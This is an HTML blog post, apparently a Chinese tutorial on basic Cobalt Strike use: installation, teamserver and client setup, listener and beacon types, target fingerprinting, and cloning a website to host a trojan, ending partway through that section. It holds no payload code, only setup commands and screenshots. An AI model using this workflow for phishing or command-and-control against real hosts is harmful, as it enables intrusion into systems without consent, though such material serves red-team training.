@@ -1,0 +1,963 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="r1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1 Cobalt Strike的特点Cobalt Strike简称CS 用于团队作战使用，由一个服务端和多个客户端组成，能让多个攻击者这在一个团队服务器上共享目标资源和信息 CS有很多Payload的生成模块 可以生成EXE，dll，vbs，图片马，bad，vba宏，和shellcode等等 CS还支持钓鱼攻击，可自动化挂马链接生成 CS还有很多后渗透模块，浏览器代理模块，端口转发 扫描，提权，s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CS基础操作">
+<meta property="og:url" content="http://example.com/2023/10/27/CS%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/index.html">
+<meta property="og:site_name" content="r1ckyL&#39;s secret">
+<meta property="og:description" content="1 Cobalt Strike的特点Cobalt Strike简称CS 用于团队作战使用，由一个服务端和多个客户端组成，能让多个攻击者这在一个团队服务器上共享目标资源和信息 CS有很多Payload的生成模块 可以生成EXE，dll，vbs，图片马，bad，vba宏，和shellcode等等 CS还支持钓鱼攻击，可自动化挂马链接生成 CS还有很多后渗透模块，浏览器代理模块，端口转发 扫描，提权，s">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/75b6e43ff3704734b9159eb6d869f2fb-1695967963040-46.png">
+<meta property="og:image" content="http://example.com/img/14891048f1a443189271648fb648ac83.png">
+<meta property="og:image" content="http://example.com/img/f306b313bbb943a3a531743cf850d3c9.png">
+<meta property="og:image" content="http://example.com/img/0cc03d13fb46410e94bd9b42cd284a75.png">
+<meta property="og:image" content="http://example.com/img/12c18a80417e40b4966cbefa5b838500.png">
+<meta property="og:image" content="http://example.com/img/e18bba4c407d46499c610877916e6c78.png">
+<meta property="og:image" content="http://example.com/img/e682edc55ca341858951eba606500e93.png">
+<meta property="og:image" content="http://example.com/img/image-20230929141211993-1695967963041-47.png">
+<meta property="og:image" content="http://example.com/img/image-20231027095058244.png">
+<meta property="og:image" content="http://example.com/img/7d99f50064ff44a6a04548edc978fb5a.png">
+<meta property="og:image" content="http://example.com/img/image-20231027095113394.png">
+<meta property="og:image" content="http://example.com/img/17e33ff4bb0541c5ab5330227eaa2a6b.png">
+<meta property="og:image" content="http://example.com/img/2265b42b4b3042a2bd5731c7a93fdc3a.png">
+<meta property="og:image" content="http://example.com/img/763fdb9573294f8e8b13188887fe801c.png">
+<meta property="og:image" content="http://example.com/img/2b7ab0a3a89e4d62aef2a1f2700f152a.png">
+<meta property="og:image" content="http://example.com/img/50f9dd89ad804e34a6aa17da343e9bc4.png">
+<meta property="og:image" content="http://example.com/img/83e597b74afc41d78438b7b16dba048e.png">
+<meta property="og:image" content="http://example.com/img/675ee5966567465cb1ff2635c93a25dd.png">
+<meta property="og:image" content="http://example.com/img/0e5e7a66768940d9869afedf8822c4f1.png">
+<meta property="og:image" content="http://example.com/img/ef230c1ae9b044a6bbd42674b59e95d7.png">
+<meta property="og:image" content="http://example.com/img/0793bde1003d48edb588f9a0fc4744e9.png">
+<meta property="og:image" content="http://example.com/img/6df02bf4c9284e80a103c3d32bf246f5.png">
+<meta property="og:image" content="http://example.com/img/a3f4f23a27e343248963b40253202635.png">
+<meta property="og:image" content="http://example.com/img/bbfad5cfef1e4eceb6199c330cc0a46b.png">
+<meta property="og:image" content="http://example.com/img/674fa8a677b64d738f83550ee9690670.png">
+<meta property="og:image" content="http://example.com/img/541c0b6de1fd45eda97084a4cc21b7a9.png">
+<meta property="og:image" content="http://example.com/img/d8fdbc51c0194cc1966e3df1daef5e3f.png">
+<meta property="og:image" content="http://example.com/img/df5f3a99e4f34d37addae0a7add4744a.png">
+<meta property="og:image" content="http://example.com/img/24a63e41aa7446c48a138e56a7a0b282.png">
+<meta property="og:image" content="http://example.com/img/490042b5c64d41cbba7712d349202a15.png">
+<meta property="og:image" content="http://example.com/img/36f68a11068245a5a5c5767802ee4e9f.png">
+<meta property="og:image" content="http://example.com/img/4d82efac16c54a67b750be2e4cfe5360.png">
+<meta property="og:image" content="http://example.com/img/d0c92611818942deaf90391569c9a856.png">
+<meta property="og:image" content="http://example.com/img/6e3bf526c9f74669a51a578b06375eee.png">
+<meta property="og:image" content="http://example.com/img/492cc938cbe843168614f1fb19a5c4c4.png">
+<meta property="og:image" content="http://example.com/img/41a5c1651ac9441fb18126adbe6a0d4f.png">
+<meta property="og:image" content="http://example.com/img/a6c6782c584c4858b3fb03fb0170aee6.png">
+<meta property="og:image" content="http://example.com/img/888d8d4f07db487589d76b409a9a283c.png">
+<meta property="og:image" content="http://example.com/img/e0505ef1c8f3440197d821b84db7499c.png">
+<meta property="og:image" content="http://example.com/img/30c3466760b74a0ca5eea3d37a65af3b.png">
+<meta property="og:image" content="http://example.com/img/9969011be032489c8be8b39aa5e21406.png">
+<meta property="og:image" content="http://example.com/img/5c6b9d0a35a6439ea049c401ad493319.png">
+<meta property="og:image" content="http://example.com/img/dd792386511c4f028d239aaeb1cf5060.png">
+<meta property="og:image" content="http://example.com/img/image-20230929150104748.png">
+<meta property="og:image" content="http://example.com/img/242bc7796dc84d26a5013b558ce7b8c9.png">
+<meta property="og:image" content="http://example.com/img/66e35b4a9f0048aaa06d3d4dc712b206.png">
+<meta property="article:published_time" content="2023-10-27T02:17:06.000Z">
+<meta property="article:modified_time" content="2023-10-27T02:17:45.382Z">
+<meta property="article:author" content="r1">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/75b6e43ff3704734b9159eb6d869f2fb-1695967963040-46.png">
+  
+  
+  
+  <title>CS基础操作 - r1ckyL&#39;s secret</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"VM6iIPhII9dNKYvDTSfaQlfY-MdYXbMMI","app_key":"ji1dPD8DG5BrS1OfKrqzGDUL","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>r1ckyL</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CS基础操作"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-27 10:17" pubdate>
+          2023年10月27日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          39 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CS基础操作</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="1-Cobalt-Strike的特点"><a href="#1-Cobalt-Strike的特点" class="headerlink" title="1 Cobalt Strike的特点"></a>1 Cobalt Strike的特点</h1><p>Cobalt Strike简称CS 用于团队作战使用，由一个服务端和多个客户端组成，<strong>能让多个攻击者这在一个团队服务器上共享目标资源和信息</strong></p>
+<p>CS有很多Payload的生成模块 可以生成EXE，dll，vbs，图片马，bad，vba宏，和shellcode等等</p>
+<p>CS还支持钓鱼攻击，可自动化挂马链接生成</p>
+<p>CS还有很多后渗透模块，浏览器代理模块，端口转发 扫描，提权，socks代理 ，令牌窃取等</p>
+<p>Cobalt Strike 分为服务端和客户端</p>
+<p>服务端 可以部署在远程服务器下或者 部署在kali里</p>
+<p>客户端 可以部署到本地  支持linux和windows系统</p>
+<p><img src="/img/75b6e43ff3704734b9159eb6d869f2fb-1695967963040-46.png" srcset="/img/loading.gif" lazyload alt="16478585820453010889ffy"></p>
+<h1 id="2-Cobalt-Strike-安装与环境配置（kali）"><a href="#2-Cobalt-Strike-安装与环境配置（kali）" class="headerlink" title="2 Cobalt Strike 安装与环境配置（kali）"></a>2 Cobalt Strike 安装与环境配置（kali）</h1><p>准备环境 ：</p>
+<p>CS4.4</p>
+<p>jdk11（如果使用kali 则不需要另外安装jdk）</p>
+<h2 id="2-1-其他linux系统安装jdk"><a href="#2-1-其他linux系统安装jdk" class="headerlink" title="2.1 其他linux系统安装jdk"></a>2.1 其他linux系统安装jdk</h2><p>使用 APT 安装 OpenJDK 11：</p>
+<h4 id="1-升级APT"><a href="#1-升级APT" class="headerlink" title="1 升级APT"></a>1 升级APT</h4><p>sudo apt-get update</p>
+<p>或</p>
+<p>apt-get update</p>
+<h4 id="2-使用-APT-安装-OpenJDK-11："><a href="#2-使用-APT-安装-OpenJDK-11：" class="headerlink" title="2 使用 APT 安装 OpenJDK 11："></a>2 使用 APT 安装 OpenJDK 11：</h4><p>sudo apt-get install openjdk-11-jdk</p>
+<p>或</p>
+<p>apt-get install openjdk-11-jdk</p>
+<h4 id="3-将-OpenJDK-11-设置为默认-Java-程序："><a href="#3-将-OpenJDK-11-设置为默认-Java-程序：" class="headerlink" title="3 将 OpenJDK 11 设置为默认 Java 程序："></a>3 将 OpenJDK 11 设置为默认 Java 程序：</h4><p>sudo update-java-alternatives -s java-1.11.0-openjdk-amd64</p>
+<p>或</p>
+<p>update-java-alternatives -s java-1.11.0-openjdk-amd64</p>
+<h2 id="2-2-开始安装"><a href="#2-2-开始安装" class="headerlink" title="2.2 开始安装"></a>2.2 开始安装</h2><p>Cobalt Strike 4.4 安装包</p>
+<p><img src="/img/14891048f1a443189271648fb648ac83.png" srcset="/img/loading.gif" lazyload alt="image.png">将CS4.4解压</p>
+<p><img src="/img/f306b313bbb943a3a531743cf850d3c9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>创建一个目录去存解压文件</p>
+<p><img src="/img/0cc03d13fb46410e94bd9b42cd284a75.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="/img/12c18a80417e40b4966cbefa5b838500.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>给服务的启动文件赋 777权限</p>
+<p>进入终端找到CS4目录  然后 chmod 777 teamserver   （注意我这边是使用root终端操作的）</p>
+<p><img src="/img/e18bba4c407d46499c610877916e6c78.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>完成环境配置</p>
+<h1 id="3-Cobalt-Strike-安装与环境配置（Windows）"><a href="#3-Cobalt-Strike-安装与环境配置（Windows）" class="headerlink" title="3 Cobalt Strike 安装与环境配置（Windows）"></a>3 Cobalt Strike 安装与环境配置（Windows）</h1><h2 id="3-1-下载Windows-x64-OpenJDK：https-jdk-java-net-archive"><a href="#3-1-下载Windows-x64-OpenJDK：https-jdk-java-net-archive" class="headerlink" title="3.1 下载Windows x64 OpenJDK：https://jdk.java.net/archive/"></a>3.1 下载Windows x64 OpenJDK：<a target="_blank" rel="noopener" href="https://jdk.java.net/archive/">https://jdk.java.net/archive/</a></h2><p><img src="/img/e682edc55ca341858951eba606500e93.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>然后解压并找个位置放这个  jdk-11.0.1  注意路径最好不要有中文。</p>
+<p><img src="/img/image-20230929141211993-1695967963041-47.png" srcset="/img/loading.gif" lazyload alt="image-20230929141211993"></p>
+<p>我这边把jdk-11.0.1放到E盘根目录</p>
+<h2 id="3-2-环境变量配置"><a href="#3-2-环境变量配置" class="headerlink" title="3.2 环境变量配置"></a>3.2 环境变量配置</h2><p><img src="/img/image-20231027095058244.png" srcset="/img/loading.gif" lazyload alt="image-20231027095058244"></p>
+<p><img src="/img/7d99f50064ff44a6a04548edc978fb5a.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>进入CMD  输入  java -version</p>
+<p><img src="/img/image-20231027095113394.png" srcset="/img/loading.gif" lazyload alt="image-20231027095113394"></p>
+<h1 id="4-Cobalt-Strike团队服务器启动"><a href="#4-Cobalt-Strike团队服务器启动" class="headerlink" title="4 Cobalt Strike团队服务器启动"></a>4 Cobalt Strike团队服务器启动</h1><p>打开root终端进入CS 目录</p>
+<p>在终端中输入： .&#x2F;teamserver 192.168.3.56 123456</p>
+<p>解释</p>
+<p><img src="/img/17e33ff4bb0541c5ab5330227eaa2a6b.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>看到这个提示证明已经启动完成</p>
+<p><img src="/img/2265b42b4b3042a2bd5731c7a93fdc3a.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>到此CS服务器启动完成了</p>
+<h1 id="5-Cobalt-Strike客户端连接到团队服务（Linux）"><a href="#5-Cobalt-Strike客户端连接到团队服务（Linux）" class="headerlink" title="5 Cobalt Strike客户端连接到团队服务（Linux）"></a>5 Cobalt Strike客户端连接到团队服务（Linux）</h1><p>进入CS目录</p>
+<p><img src="/img/763fdb9573294f8e8b13188887fe801c.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>然后输入 .&#x2F;cobaltstrike  即可</p>
+<p><img src="/img/2b7ab0a3a89e4d62aef2a1f2700f152a.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>第一次使用CS会提示权限不够</p>
+<p><img src="/img/50f9dd89ad804e34a6aa17da343e9bc4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>我们可以直接给cobaltstrike 赋777权限,然后在启动即课</p>
+<p>终端内输入 chmod 777 cobaltstrike</p>
+<p><img src="/img/83e597b74afc41d78438b7b16dba048e.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>启动CS完成后根据服务器配置输入IP ，端口，用户名，密码</p>
+<p><img src="/img/675ee5966567465cb1ff2635c93a25dd.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>看到提示点击  Yes即可</p>
+<p><img src="/img/0e5e7a66768940d9869afedf8822c4f1.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>稍等片刻即可启动完成 （如果电脑较卡启动时间会稍微有点长多等一下）</p>
+<p><img src="/img/ef230c1ae9b044a6bbd42674b59e95d7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h1 id="6-Cobalt-Strike客户端连接团队服务（Windows）"><a href="#6-Cobalt-Strike客户端连接团队服务（Windows）" class="headerlink" title="6 Cobalt Strike客户端连接团队服务（Windows）"></a>6 Cobalt Strike客户端连接团队服务（Windows）</h1><p><strong>注意Cobalt Strike这款软件最好在虚拟机内执行避免后门反噬主机</strong></p>
+<p>解压CS安装包</p>
+<p><img src="/img/0793bde1003d48edb588f9a0fc4744e9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>启动方法1 直接管理员方式执行 cobaltstrike.bat</p>
+<p>启动方法2 在CMD中运行，注意CMD也要管理员权限</p>
+<p><img src="/img/6df02bf4c9284e80a103c3d32bf246f5.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="/img/a3f4f23a27e343248963b40253202635.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="/img/bbfad5cfef1e4eceb6199c330cc0a46b.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>启动CS完成后根据服务器配置输入IP ，端口，用户名，密码</p>
+<p><img src="/img/674fa8a677b64d738f83550ee9690670.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>看到服务器指纹确认点Yes  服务器指纹应与服务启动时一样</p>
+<p><img src="/img/541c0b6de1fd45eda97084a4cc21b7a9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="/img/d8fdbc51c0194cc1966e3df1daef5e3f.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<hr>
+<h1 id="7-Cobalt-Strik功能介绍"><a href="#7-Cobalt-Strik功能介绍" class="headerlink" title="7 Cobalt Strik功能介绍"></a>7 Cobalt Strik功能介绍</h1><p><img src="/img/df5f3a99e4f34d37addae0a7add4744a.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>图标栏功能说明</p>
+<p>1 添加新的 Cobalt Strik 团队服务器</p>
+<p>2 删除当前 Cobalt Strik 团队服务器</p>
+<p>3 新建一个监听器</p>
+<p>4 切换图形会话按钮</p>
+<p>5 切换列表会话按钮</p>
+<p>6  以列表方式显示目标</p>
+<p>7 密码凭证栏按钮</p>
+<p>8 下载文件列表</p>
+<p>9 键盘记录表</p>
+<p>10 屏幕截图表</p>
+<p>11 生成Windows下可执行木马</p>
+<p>12 生成java签名applet攻击</p>
+<p>13 生成office 宏攻击</p>
+<p>14 生成powershell后门</p>
+<p>15  文件托管按钮</p>
+<p>16 管理web站点</p>
+<p>17 帮助文档</p>
+<p>18 关于</p>
+<h1 id="8-创建一个监控"><a href="#8-创建一个监控" class="headerlink" title="8  创建一个监控"></a>8  创建一个监控</h1><h2 id="8-1-监控器链接方式简介"><a href="#8-1-监控器链接方式简介" class="headerlink" title="8.1 监控器链接方式简介"></a><strong>8.1 监控器链接方式简介</strong></h2><p>beacon是cs内置的监听器，当我们在目标机器上成功执行Payload后，会返回一个shell发送到cs上。</p>
+<p>foreign主要是提供给cs外的工具使用的监听器，例如派生出来msf的shell来进行后渗透。</p>
+<p>External C2 是 cs引入的一种规范（或者框架），黑客可以利用这个功能拓展C2通信渠道，而不局限于默认提供的 http，https，dns，smb tcp 通道。大家可以参考 <a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/downloads/externalc2spec.pdf">此处</a> 下载完整的规范说明。</p>
+<p>简而言之， 用户可以使用这个框架来开发各种组件，包括如下组件：</p>
+<ul>
+<li>第三方控制端（Controller）：负责连接 Cobalt Strike TeamServer，并且能够使用自定义的 C2 通道与目标主机上的第三方客户端（Client）通信。</li>
+<li>第三方客户端（Client）：使用自定义C2通道与第三 Controller 通信，将命令转发至 SMB Beacon。</li>
+<li>SMB Beacon：在受害者主机上执行的标准 beacon。</li>
+</ul>
+<h2 id="8-2-Beacon分类"><a href="#8-2-Beacon分类" class="headerlink" title="8.2 Beacon分类"></a><strong>8.2 Beacon分类</strong></h2><p><strong>Beacon是Cobalt Strike运行在目标主机上的payload，Beacons是在隐蔽信道上给我们提供服务，用于长期控制受感染主机</strong> 。它的工作方式与Metasploit类似。在实际渗透过程中，我们可以将其 <strong>嵌入到可执行文件</strong> 、<strong>添加到Word文档</strong>或者通过<strong>利用主机漏洞</strong>来传递Beacon。</p>
+<ol>
+<li>DNS Beacon</li>
+<li>HTTP 和 HTTPS Beacon</li>
+<li>SMB Beacon</li>
+<li>TCP Beacon</li>
+</ol>
+<h3 id="8-2-1-DNS-Beacon"><a href="#8-2-1-DNS-Beacon" class="headerlink" title="8.2.1 DNS Beacon"></a>8.2.1 DNS Beacon</h3><p>DNS Beacon，就是使用DNS请求将Beacon返回。DNS 请求用于解析由你的 CS 团队服务器</p>
+<p>DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务</p>
+<p>注意：</p>
+<p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式</p>
+<p>DNS Beacon优点：</p>
+<p>拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。</p>
+<p><img src="/img/24a63e41aa7446c48a138e56a7a0b282.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="8-2-2-HTTP-和-HTTPS-Beacon"><a href="#8-2-2-HTTP-和-HTTPS-Beacon" class="headerlink" title="8.2.2  HTTP 和 HTTPS Beacon"></a>8.2.2  HTTP 和 HTTPS Beacon</h3><p>HTTP Beacon 利用http请求来进行通信来向受害主机传达命令，达到控制对方主机的目的。缺点是明文传输。</p>
+<p>HTTPS Beacon 增加了加密传输，其余跟http完全相同。</p>
+<p><img src="/img/490042b5c64d41cbba7712d349202a15.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="8-2-3-SMB-Beacon"><a href="#8-2-3-SMB-Beacon" class="headerlink" title="8.2.3  SMB Beacon"></a>8.2.3  SMB Beacon</h3><p><strong>官网的解释为</strong> ：<em>SMB Beacon 使用命名管道通过父 Beacon 进行通信，这种点对点通信借助 Beacons 在同一台主机上实现，它同样也适用于外部的互联网。Windows 当中借助在 SMB 协议中封装命名管道进行通信，因此，命名为 SMB Beacon。</em></p>
+<p>以上的说法，其实就是将 <code>Payload</code> 运行（注入）后，创建了自定义命名管道（作服务端），等待连接即可。</p>
+<p><img src="/img/36f68a11068245a5a5c5767802ee4e9f.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="8-2-4-TCP-Beacon"><a href="#8-2-4-TCP-Beacon" class="headerlink" title="8.2.4  TCP Beacon"></a>8.2.4  TCP Beacon</h3><p>TCP Beacon和SMB Beacon类似只不过TCP Beacon不是使用SMB与父Beacon进行通信而是使用TCP socket进行通信，cs4.0之后，这个技术就不适合做第一个木马使用，因为他的流量都是明文的，容易被发现但是这个技术，很适合在内网穿透的时候去使用，在内网穿透的时候一般只能使用tcp beacon去生成木马。</p>
+<p>点击<img src="/img/4d82efac16c54a67b750be2e4cfe5360.png" srcset="/img/loading.gif" lazyload alt="image.png">或 点击监听器</p>
+<p><img src="/img/d0c92611818942deaf90391569c9a856.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="/img/6e3bf526c9f74669a51a578b06375eee.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="/img/492cc938cbe843168614f1fb19a5c4c4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h1 id="9-Cobalt-Strik-目标主机信息收集"><a href="#9-Cobalt-Strik-目标主机信息收集" class="headerlink" title="9  Cobalt Strik 目标主机信息收集"></a>9  Cobalt Strik 目标主机信息收集</h1><p>Cobalt Strik内置信息收集模块 可以收集 目标主机的操作系统版本 系统位数  浏览器  版本  位数</p>
+<p>方便攻击者针对性攻击</p>
+<p><img src="/img/41a5c1651ac9441fb18126adbe6a0d4f.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>配置信息收集  有4个参数可以设置  分别为 本地URL   本地Host  本地端口  跳转URL</p>
+<p>本地URL    配置的参数是访问ip后面的参数</p>
+<p>本地Host   是当前Cobalt Strik服务器的内网或公网IP</p>
+<p>本地端口    默认是80  如果80被占用了就需要设置其他的 如 81  82  83 都可以</p>
+<p>跳转URL    默认可不设置跳转</p>
+<p><img src="/img/a6c6782c584c4858b3fb03fb0170aee6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>靶机访问  weblog中查看</p>
+<h1 id="10-Cobalt-Strik-克隆网页并挂马"><a href="#10-Cobalt-Strik-克隆网页并挂马" class="headerlink" title="10 Cobalt Strik 克隆网页并挂马"></a>10 Cobalt Strik 克隆网页并挂马</h1><p>克隆网页</p>
+<p><img src="/img/888d8d4f07db487589d76b409a9a283c.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="10-1-配置网站克隆"><a href="#10-1-配置网站克隆" class="headerlink" title="10.1 配置网站克隆"></a>10.1 配置网站克隆</h2><p>克隆URL  输入http网站链接</p>
+<p>本地URL    配置的参数是访问ip后面的参数</p>
+<p>本地Host   是当前Cobalt Strik服务器的内网或公网IP</p>
+<p>本地端口    默认是80  如果80被占用了就需要设置其他的 如 81  82  83 都可以</p>
+<p>攻击地址 ： 默认不配置</p>
+<p><img src="/img/e0505ef1c8f3440197d821b84db7499c.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>配置完成后靶机访问  本地host地址</p>
+<h2 id="10-2-挂马"><a href="#10-2-挂马" class="headerlink" title="10.2 挂马"></a>10.2 挂马</h2><p><img src="/img/30c3466760b74a0ca5eea3d37a65af3b.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>克隆URL  输入http网站链接</p>
